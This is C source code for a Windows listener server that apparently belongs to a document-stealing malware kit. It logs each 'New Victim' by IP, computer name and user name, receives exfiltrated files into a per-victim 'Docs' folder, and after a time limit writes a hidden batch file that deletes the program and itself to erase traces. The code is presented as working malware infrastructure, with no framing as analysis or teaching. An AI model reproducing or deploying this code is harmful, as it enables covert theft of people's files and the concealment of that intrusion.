#include "commun.h"


#define BUFFER_SIZE 1024
#define BIND_PORT_DIR_CREATE 8080
#define BIND_PORT_FILE_TRANSFER 8081


// Declare serverSocket, clientSocket, and related variables as global
SOCKET serverSocketDirCreate, serverSocketFileTransfer, clientSocket;
struct sockaddr_in client;
char buffer[BUFFER_SIZE];
int recvSize;


void HandleClientDirCreate() {

    int clientSize = sizeof(struct sockaddr_in);
    clientSocket = accept(serverSocketDirCreate, (struct sockaddr*)&client, &clientSize);
    if (clientSocket == INVALID_SOCKET) {
        fprintf(stderr, "Accept failed. Error Code : %d", WSAGetLastError());
        return;
    }

    
    // Read the metadata
    recvSize = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    buffer[recvSize] = '\0';


    char ip[16], computerName[MAX_COMPUTERNAME_LENGTH + 1], userName[128];
    sscanf(buffer, "{\"ip\":\"%15[^\"]\",\"computerName\":\"%[^\"]\",\"userName\":\"%[^\"]\"}", ip, computerName, userName);

    //printf("[+] IP: %s\n", ip);
    //printf("[+] Computer name: %s\n", computerName);
    //printf("[+] User name: %s\n", userName);

    // Construct folder name and create it
    char folderName[MAX_PATH];
    snprintf(folderName, sizeof(folderName), "%s-%s-%s", ip, computerName, userName);


    char response[256];  // Adjusted size for response string

    BOOL directoryCreated = CreateDirectoryA(folderName, NULL);
    DWORD lastError = GetLastError();

    
    if (directoryCreated) {
        snprintf(response, sizeof(response), "Directory %s created successfully!", folderName);
    }
    else if (lastError == ERROR_ALREADY_EXISTS) {
        snprintf(response, sizeof(response), "Directory %s already exists.", folderName);
    }
    else {
        snprintf(response, sizeof(response), "Failed to create directory: %s. Error Code : %d", folderName, lastError);
    }

    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    // Print the response to console only when the directory is created successfully
    if (directoryCreated) {
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED); // Set text color to red
        printf("\n\n[+] New Victim:\n");
        printf("\t[+] IP: %s\n", ip);
        printf("\t[+] Computer name: %s\n", computerName);
        printf("\t[+] User name: %s\n", userName);
        printf("\n[+] %s\n\n", response);
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE); // Reset text color to default (white)
    }


    //send(clientSocket, response, strlen(response), 0);

    closesocket(clientSocket);
    //printf("[+] Directory %s processed successfully.\n\n", folderName);
}



DWORD WINAPI StartDirCreateHandler(LPVOID lpParam) {

    while (TRUE) {
        HandleClientDirCreate();
    }

    return 0;
}


#define MOD_ADLER 65521

uint32_t Adler32(const char* str) {
    uint32_t a = 1, b = 0;

    while (*str) {
        a = (a + *str) % MOD_ADLER;
        b = (b + a) % MOD_ADLER;
        str++;
    }

    return (b << 16) | a;
}



int ensureDirExists(const char* path) {
    DWORD dwAttrib = GetFileAttributesA(path);

    if (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        (dwAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
        return 1; // Directory exists
    }
    else {
        // Try to create the directory
        if (_mkdir(path) == 0) {
            return 1; // Directory created successfully
        }
        else {
            return 0; // Failed to create directory
        }
    }
}




void HandleClients() {
    char buffer[BUFFER_SIZE];
    int recvSize;

    struct sockaddr_in client;
    int clientSize = sizeof(client);

    SOCKET clientSocket = accept(serverSocketFileTransfer, (struct sockaddr*)&client, &clientSize);
    if (clientSocket == INVALID_SOCKET) {
        fprintf(stderr, "Accept failed. Error Code : %d", WSAGetLastError());
        return;
    }

    // Receive the size of the JSON data
    int jsonSize;
    recvSize = recv(clientSocket, (char*)&jsonSize, sizeof(jsonSize), 0);
    if (recvSize != sizeof(jsonSize)) {
        fprintf(stderr, "Failed to receive size of JSON data.\n");
        closesocket(clientSocket);
        return;
    }
    jsonSize = ntohl(jsonSize); // Convert from network to host byte order

    // Receive the JSON data
    char* jsonBuffer = (char*)malloc(jsonSize + 1);
    if (!jsonBuffer) {
        fprintf(stderr, "Memory allocation error.\n");
        closesocket(clientSocket);
        return;
    }

    recvSize = recv(clientSocket, jsonBuffer, jsonSize, 0);
    if (recvSize != jsonSize) {
        fprintf(stderr, "Failed to receive JSON data.\n");
        free(jsonBuffer);
        closesocket(clientSocket);
        return;
    }

    jsonBuffer[jsonSize] = '\0';

    char filePath[MAX_PATH], ip[16], computerName[MAX_COMPUTERNAME_LENGTH + 1], userName[128], fileHash[65];
    long fileSize;

    sscanf(jsonBuffer, "{\"ip\":\"%15[^\"]\",\"computerName\":\"%[^\"]\",\"userName\":\"%[^\"]\",\"fileHash\":\"%64[^\"]\",\"filePath\":\"%[^\"]\",\"fileSize\":\"%ld\"}",
        ip, computerName, userName, fileHash, filePath, &fileSize);

    free(jsonBuffer);

    char* filename = strrchr(filePath, '\\');
    if (!filename) {
        filename = filePath;
    }
    else {
        filename++;
    }

    char directoryName[MAX_PATH];
    snprintf(directoryName, sizeof(directoryName), "%s-%s-%s", ip, computerName, userName);

    char docsPath[MAX_PATH];
    snprintf(docsPath, sizeof(docsPath), "%s\\Docs", directoryName);

    // Ensure the directory structure exists
    if (!ensureDirExists(directoryName) || !ensureDirExists(docsPath)) {
        fprintf(stderr, "Failed to ensure directory structure. Path: %s\n", docsPath);
        closesocket(clientSocket);
        return;
    }

    uint32_t adlerChecksum = Adler32(filePath);
    char searchPattern[MAX_PATH];
    snprintf(searchPattern, sizeof(searchPattern), "%s\\*-%08X-%s", docsPath, adlerChecksum, filename);

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFileA(searchPattern, (LPWIN32_FIND_DATAA)&findFileData);
    char fullPath[MAX_PATH];

    if (hFind != INVALID_HANDLE_VALUE) {
        char existingFileHash[65] = { 0 };  // Initialize it to zeros
        
        char filenameAnsi[MAX_PATH];
        WideCharToMultiByte(CP_UTF8, 0, findFileData.cFileName, -1, filenameAnsi, sizeof(filenameAnsi), NULL, NULL);

        // Extract the hash from the filename
        sscanf(filenameAnsi, "%64[^-]", existingFileHash);

        if (strcmp(existingFileHash, fileHash) == 0) {
            // File hashes match, don't overwrite.
            FindClose(hFind);
            closesocket(clientSocket);
            printf("File already exists with the same hash. No action taken.\n");
            return;
        }
        else {
            // File hashes don't match, overwrite the file.
            snprintf(fullPath, sizeof(fullPath), "%s\\%s-%08X-%s", docsPath, fileHash, adlerChecksum, filename);
        }
        FindClose(hFind);
    }
    else {
        // File doesn't exist. Use the desired new file name format.
        snprintf(fullPath, sizeof(fullPath), "%s\\%s-%08X-%s", docsPath, fileHash, adlerChecksum, filename);
    }

    FILE* file = fopen(fullPath, "wb");
    if (!file) {
        fprintf(stderr, "File could not be opened. Path: %s\n", fullPath);
        closesocket(clientSocket);
        return;
    }

    while (fileSize > 0 && (recvSize = recv(clientSocket, buffer, BUFFER_SIZE, 0)) > 0) {
        fwrite(buffer, 1, recvSize, file);
        fileSize -= recvSize;
    }

    if (recvSize < 0) {
        fprintf(stderr, "Error receiving file data.\n");
    }

    fclose(file);
    printf("[+] File received and saved/updated successfully.\n\n");
    closesocket(clientSocket);
}



int main() {

    DWORD startTick = GetTickCount();

    WSADATA wsaData;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    serverSocketDirCreate = socket(AF_INET, SOCK_STREAM, 0);
    serverSocketFileTransfer = socket(AF_INET, SOCK_STREAM, 0);

    if (serverSocketDirCreate == INVALID_SOCKET) {
        fprintf(stderr, "Could not create serverSocketDirCreate : %d", WSAGetLastError());
        return 1;
    }


    if (serverSocketFileTransfer == INVALID_SOCKET) {
        fprintf(stderr, "Could not create serverSocketFileTransfer : %d", WSAGetLastError());
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    
    // Bind and listen for directory creation
    server.sin_port = htons(BIND_PORT_DIR_CREATE);
    if (bind(serverSocketDirCreate, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        fprintf(stderr, "Bind for directory creation failed. Error Code : %d", WSAGetLastError());
        return 1;
    }
    listen(serverSocketDirCreate, 3);

    // Bind and listen for file transfer
    server.sin_port = htons(BIND_PORT_FILE_TRANSFER);
    if (bind(serverSocketFileTransfer, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        fprintf(stderr, "Bind for file transfer failed. Error Code : %d", WSAGetLastError());
        return 1;
    }
    listen(serverSocketFileTransfer, 3);



    // Start the metadata handler in its own thread
    HANDLE hThread = CreateThread(NULL, 0, StartDirCreateHandler, NULL, 0, NULL);
    if (hThread == NULL) {
        fprintf(stderr, "Error creating dir handling thread. Error Code: %ld\n", GetLastError());
        return 1;
    }


    // The main thread will handle the clients for file writing
    while (TRUE) {

        HandleClients();

        if (GetTickCount() - startTick > 122400000) {
            char batchCmds[512];
            sprintf(batchCmds,
                ":tryAgain\n"
                "del \"%s\"\n"
                "if exist \"%s\" goto tryAgain\n"
                "del \"%%~f0\"",  // This deletes the batch script itself
                __argv[0],  // This should contain the full path to the currently running executable
                __argv[0]
            );

            char batchFileName[MAX_PATH];
            sprintf(batchFileName, "%s_del.bat", __argv[0]);

            FILE* batch = fopen(batchFileName, "w");
            if (batch) {
                fputs(batchCmds, batch);
                fclose(batch);

                // Run the batch file in the background
                ShellExecuteA(0, "open", batchFileName, 0, 0, SW_HIDE);
            }
            break;  // Break out of the loop if 24 hours have passed
        }
        
    }
    
    
    // Added the WSACleanup() call here
    WSACleanup();

    return 0;
}